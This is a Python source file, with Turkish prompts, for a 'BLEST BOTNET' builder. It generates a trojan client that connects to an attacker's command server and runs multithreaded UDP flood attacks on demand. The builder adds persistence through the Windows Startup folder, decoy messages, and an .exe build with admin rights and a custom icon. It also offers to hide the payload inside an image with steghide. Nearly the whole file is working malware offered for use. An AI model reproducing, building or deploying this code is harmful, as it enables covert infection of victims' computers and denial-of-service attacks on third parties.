import os
import time
import subprocess
import colorama
from colorama import Fore, Back, Style
import sys
import random
from sys import platform
type = 'BOTNET'
load = ['-', '\\', '|', '/']
true = ["True", "TRUE", "true"]
false = ["False", "FALSE", "false"]
PY_TO_EXE = "False"
SERVER_IP=""
SERVER_PORT=1234
EXE_ICON=""
HIDE_JPG_PNG=""
ERR_MSG=""
START_MSG=""
AUTORUN="False"
print(f"> Botnet emrleri için {Fore.GREEN}'help'{Fore.RESET} yazın")


help_menu = '''
BLEST BOTNET Yardım Menüsü
============================

    Emrler                          Hakkında
    ----------                      ------------
    show options                    BOTNET seçeneklerini göster
    set <seçenek> <değer>           Belirtilen seçeneği belirtilen değere değiştirin
    back                            Ana çerçeveye geri dön
    build                           trojanı oluşturmaya başlayın
    start                           Sunucuyu başlatın ve bağlantıları bekleyin


BLEST BOTNET SERVER Yardım Menüsü
===================================

    Emrler                          Hakkında
    ----------                      ------------
    attack udp                      Saldırını belirtilen seçeneklere başlayın (Sunucu kabuğunda mevcutdur!)
    ping                            Sunucunun canlı veya ölü olduğunu izle
    list                            Tüm çevrimiçi sunucuları göster
    update                          Listedeki istemcileri güncelle (sunucu)
    kill                            Mevcut tüm sunucuları durdurun (niye ya?)
'''
try:
    flood = input("(\033[4mblest\033[0m)-("+Fore.RED+f"BOTNET"+Fore.RESET+") > ").strip(" ")
except Exception:
    exit()
flood = flood.split()
while True:
    if flood == []:
        pass
    elif flood[0] == 'help' or flood[0] == '?':
        print(help_menu)
    elif flood[0] == 'back' or flood[0] == 'exit' or flood[0] == 'quit':
        sys.exit()
    elif flood[0] == 'show':
        if len(flood) < 2:
            print(Fore.RED + '[-]' + Fore.RESET + ' Show için kullanılabilenler: (options)')
        else:
            try:
                if flood[1] == 'options':
                    options = f'''
----------------------------------------------------------------------------------------------------------
> BOTNET TROJAN seçenekleri:

Seçenek             Hakkında                                                                Değer
---------           ----------                                                              -------
PY_TO_EXE           .py'yi .exe'ye dönüştürün (PYINSTALLER)                                 {PY_TO_EXE}
EXE_ICON            Kendi .exe simgesi ekle (.ico fayl) (hiçbir şey için boş bırakın)       {EXE_ICON}
HIDE_JPG_PNG        Trojan'ı JPG, PNG dosyasına gizlet (hiçbir şey için boş bırakın)        {HIDE_JPG_PNG}
ERR_MSG             Hata mesajını göster (hiçbir şey için boş bırakın)                      {ERR_MSG}
START_MSG           Trojan açıldığında mesajı göster (hiçbir şey için boş bırakın)          {START_MSG}
AUTORUN             Trojanı sistemin başlatılmasına kopyalayın (SHELL:STARTUP)              {AUTORUN}

----------------------------------------------------------------------------------------------------------
> BOTNET SERVER seçenekleri:

Seçenek             Hakkında                                                                Değer
---------           ----------                                                              -------
SERVER_IP           İstemcileri bağlamak için sunucu ana ip adresi (BOTNET)                 {SERVER_IP}
SERVER_PORT         İstemcileri bağlamak için sunucu bağlantı noktası (port) adresi         {SERVER_PORT}
'''
                    print(options)
                else:
                    print(Fore.RED+'[-]'+Fore.RESET+' Bilinmeyen argüment: "'+flood[1]+'"')
            except:
                pass
    elif flood[0] == 'set':
        if len(flood) < 3:
            print(Fore.RED+'[-]'+Fore.RESET+' kullanımı: set <seçenek> <değer>')
        else:
            try:
                if flood[1] == 'PY_TO_EXE' or flood[1] == 'py_to_exe':
                    if flood[2] in false or flood[2] in true:
                        if flood[2] in false:
                            PY_TO_EXE="False"
                            print(Fore.BLUE+'[i]'+Fore.RESET+' PY_TO_EXE ==> '+PY_TO_EXE)
                        elif flood[2] in true:
                            PY_TO_EXE='True'
                            print(Fore.BLUE+'[i]'+Fore.RESET+' PY_TO_EXE ==> '+PY_TO_EXE)
                        else:
                            print(Fore.RED+'[-]'+Fore.RESET+' Mevcut (True, False)')
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Mevcut (True, False)')
                elif flood[1] == 'SERVER_IP' or flood[1] == 'server_ip':
                    if '.' in flood[2]:
                        SERVER_IP=flood[2]
                        print(Fore.BLUE+'[i]'+Fore.RESET+' SERVER_IP ==> '+SERVER_IP)
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Lütfen geçerli bir IP girin!')
                elif flood[1] == 'SERVER_PORT' or flood[1] == 'server_port':
                    SERVER_PORT=flood[2]
                    print(Fore.BLUE+'[i]'+Fore.RESET+' SERVER_PORT ==> '+SERVER_PORT)
                elif flood[1] == 'EXE_ICON' or flood[1] == 'exe_icon':
                    if PY_TO_EXE in false:
                        print(Fore.RED+'[-]'+Fore.RESET+" Bu seçeneği kullanmak için lütfen 'PY_TO_EXE' seçeneki etkinleştirin!")
                    else:
                        if '.ico' in flood[2]:
                            if os.path.exists(flood[2]):
                                EXE_ICON=flood[2]
                                print(Fore.BLUE+'[i]'+Fore.RESET+' EXE_ICON ==> '+EXE_ICON)
                            else:
                                print(Fore.RED+'[-]'+Fore.RESET+f" Dosya '{flood[2]}' bulunmadı!")
                        else:
                            print(Fore.RED+'[-]'+Fore.RESET+' Lütfen .ico formatında dosya girin!')
                elif flood[1] == 'HIDE_JPG_PNG' or flood[1] == 'hide_jpg_png':
                    if ".jpg" in flood[2] or ".png" in flood[2]:
                        if os.path.exists(flood[2]):
                            HIDE_JPG_PNG=flood[2]
                            print(Fore.BLUE+'[i]'+Fore.RESET+' HIDE_JPG_PNG ==> '+HIDE_JPG_PNG)
                        else:
                            print(Fore.RED+'[-]'+Fore.RESET+f" Dosya '{flood[2]}' bulunmadı!")
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Lütfen .jpg ve ya .png formatında dosya girin!')
                elif flood[1] == 'ERR_MSG' or flood[1] == 'err_msg':
                    ERR_MSG=flood[2]
                    print(Fore.BLUE+'[i]'+Fore.RESET+' ERR_MSG ==> '+ERR_MSG)
                elif flood[1] == 'START_MSG' or flood[1] == 'start_msg':
                    START_MSG=flood[2]
                    print(Fore.BLUE+'[i]'+Fore.RESET+' START_MSG ==> '+START_MSG)
                elif flood[1] == 'AUTORUN' or flood[1] == 'autorun':
                    if flood[2] in false or flood[2] in true:
                        if flood[2] in false:
                            AUTORUN="False"
                            print(Fore.BLUE+'[i]'+Fore.RESET+' AUTORUN ==> '+AUTORUN)
                        elif flood[2] in true:
                            AUTORUN="True"
                            print(Fore.BLUE+'[i]'+Fore.RESET+' AUTORUN ==> '+AUTORUN)
                        else:
                            print(Fore.RED+'[-]'+Fore.RESET+' Mevcut (True, False)')
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Mevcut (True, False)')
                else:   
                    print(Fore.RED+'[-]'+Fore.RESET+' Geçersiz seçenek: "'+flood[1]+'"')
            except:
                pass
    elif flood[0] == 'build':
        BOTNET = rf'''
import tkinter
from tkinter import messagebox
import os
from threading import Thread
from time import time, sleep
import socket, signal
import sys, random
from typing import Tuple

autorun = "{AUTORUN}"
start_tkinter = "{START_MSG}"
if start_tkinter == "":
	pass
else:
	messagebox("", message=f"{START_MSG}")

user = os.environ['USERPROFILE']
if autorun == "True":
	import shutil
	shutil.copy(__file__, "C:\\Users\\"+user+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
		


class Client():
	run=False
	def __init__(self, connect:Tuple[str,int]=("127.0.0.1",9999)) -> None:
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)
		self.stop = False
		self.run = False
		while not self.stop:
			try:
				self._connect(connect)
			except KeyboardInterrupt:
				continue
			except Exception as e:
				sleep(10)

	def exit_gracefully(self,signum, frame):
		self.stop = True
		self.run = False
		self.sock.close()
		sleep(1)
		sys.exit(0)

	def _connect(self, connect:Tuple[str,int]) -> None:
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.connect(connect)
		self.start()

	def __ddos(self,*args):

		def dos(*args):
			t1=time()
			host,port=args[1],args[2]

			s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			bytes=random._urandom(10240)
			s.connect((host, int(port)))
			while self.run:
				if not self.run:break
				s.sendto(bytes, (host,int(port)))
				
			s.close()
		for n in range(int(args[4])):
			Thread(target = dos,args=[*args]).start()
		sleep(int(args[3]))
		self.run=False

	def _recv(self):
		return self.sock.recv(1024).decode("ascii").lower()

	def start(self):
		while True:
			data = self._recv()
			if "attack" in data:
				data=data.replace("attack ","").split()
				try:
					proto, ip, port, sec, workers =  data
					data = proto, ip, int(port), int(sec), int(workers)
					self.sock.send("Saldırı başladı, Zombi hedefi yakaladı".encode("ascii"))
				except Exception as e:
					messagebox("Error", message="Bir hata!")
					print(e)
					self.sock.send("Geçersiz emr".encode("ascii"))
					continue

				self.run=True
				Thread(target = self.__ddos,args=data).start()
			elif "kill" in data:
				self.run=False
				self.sock.send(str.encode("Server durdu... [OK]"))
			elif "ping" in data:
				self.sock.send(str.encode("OK"))
			else:
				self.sock.send(str.encode("Geçersiz emr veya hata"))


if __name__ == '__main__':
	Client()
'''
        if SERVER_IP == "":
            print(Fore.RED+'[-]'+Fore.RESET+' Lütfen "SERVER_IP" seçeneki doldurun!')
        else:
            try:
                print(Fore.BLUE+'[i]'+Fore.RESET+' Keş temizleniyor...')
                for zom in os.listdir("/root/.blest"):
                    os.system('rm -rf /root/.blest/'+zom)
                time.sleep(0.3)
                if PY_TO_EXE in false:
                    print(Fore.BLUE+'[i]'+Fore.RESET+" .py, .exe'ye dönüştürülmeyecek")
                for i in range(10):
                    for j in load:
                        sys.stdout.write(Fore.BLUE+f'\r[{j}]'+Fore.RESET+' Zombi generasiya olunuyor...')
                print()
                with open("/usr/share/BLEST/bots/log/botnet.py", "r") as f:
                    zzz = f.read()
                botnet = BOTNET.replace('("127.0.0.1",9999)', f'({SERVER_IP},{int(SERVER_PORT)})')
                if ERR_MSG == "":
                    pass
                else:
                    print(Fore.BLUE+'[i]'+Fore.RESET+' Hata mesajı ekleme...')
                    botnet = BOTNET.replace('messagebox("Error", message="Bir hata!")', f'messagebox("Error", message="{ERR_MSG}")')
                if START_MSG == "":
                    pass
                else:
                    print(Fore.BLUE+'[i]'+Fore.RESET+' Başlangıç mesajı ekleme...')
                    botnet = BOTNET.replace('start_tkinter = ""', f'start_tkinter = "{START_MSG}"')
                if AUTORUN in false:
                    botnet = BOTNET.replace('autorun = ""', 'autorun = "False"')
                else:
                    print(Fore.BLUE+'[i]'+Fore.RESET+' Autorun ekleme...')
                    botnet = BOTNET.replace('autorun = ""', 'autorun = "True"')
                os.system('touch /root/.blest/client.py')
                with open("/root/.blest/client.py", "a") as r:
                    r.write(BOTNET)
                with open("/usr/share/BLEST/bots/log/botnet.py", "r") as w:
                    for output in w:
                        sys.stdout.write(Fore.BLUE+f'\r[i]'+Fore.RESET+f' Zombi okunuyor...')
                sys.stdout.write(Fore.YELLOW+f'\r[+]'+Fore.RESET+' Zombi generasiya olundu\n')
                if PY_TO_EXE in true:
                    if EXE_ICON == "":
                        print(Fore.BLUE+'[i]'+Fore.RESET+" .py .exe'ye dönüştürülüyor...")
                        os.system('pyinstaller -y -w -F -n /root/.blest/CLIENT --uac-admin --clean /root/.blest/client.py')
                    else:
                        print(Fore.BLUE+'[i]'+Fore.RESET+f" .py .exe'ye dönüştürülüyor (simge: {EXE_ICON})...")
                        os.system(f'pyinstaller -y -w -F -n /root/.blest/CLIENT --uac-admin --icon={EXE_ICON} --clean /root/.blest/client.py')
                    print(Fore.BLUE+'[i]'+Fore.RESET+' Keş temizleniyor...')
                    for i in os.listdir("/root/.blest"):
                        if ".exe" in i or ".py" in i:
                            continue
                        else:
                            os.system('rm -rf /root/.blest/'+i)
                    print(Fore.BLUE+'[i]'+Fore.RESET+' Zombi saklanıldı: "/root/.blest/CLIENT.exe"')
                else:
                    print(Fore.BLUE+'[i]'+Fore.RESET+' Zombi saklanıldı: "/root/.blest/client.py"')
                if HIDE_JPG_PNG == "":
                    pass
                else:
                    for i in range(2):
                        for e in load:
                            time.sleep(0.1)
                            sys.stdout.write(Fore.BLUE+'[i]'+Fore.RESET+f" Trojan '{HIDE_JPG_PNG}' bağlanıyor... [{e}]")
                    sys.stdout.write(Fore.BLUE+'[i]'+Fore.RESET+f" Trojan '{HIDE_JPG_PNG}' bağlanıyor...")
                    print(Fore.MAGENTA+'[!]'+Fore.RESET+' Lütfen parola girin')
                    if PY_TO_EXE in false:
                        os.system(f'steghide embed -cf {HIDE_JPG_PNG} -ef /root/.blest/client.py')
                    else:
                        os.system(f'steghide embed -cf {HIDE_JPG_PNG} -ef /root/.blest/CLIENT.exe')
            except Exception:
                pass
    elif flood[0] == 'run' or flood[0] == 'start':
        if SERVER_IP == "":
            print(Fore.RED+'[-]'+Fore.RESET+' Lütfen "SERVER_IP" seçeneki doldurun!')
        else:
            time.sleep(1)
            print(Fore.BLUE+'[i]'+Fore.RESET+f" Botnet '{SERVER_IP}' sunucuda başladı...")
            os.system(f'python3 /usr/share/BLEST/network/botnet_server.py {SERVER_IP} {SERVER_PORT}')
    else:
        print(Fore.RED + '[-]' + Fore.RESET + ' Emr bulunmadı: "' + flood[0] + '"')
    try:
        flood = input("(\033[4mblest\033[0m)-(" + Fore.RED + f"BOTNET" + Fore.RESET + ") > ").strip(" ")
    except Exception:
        exit()
    flood = flood.split()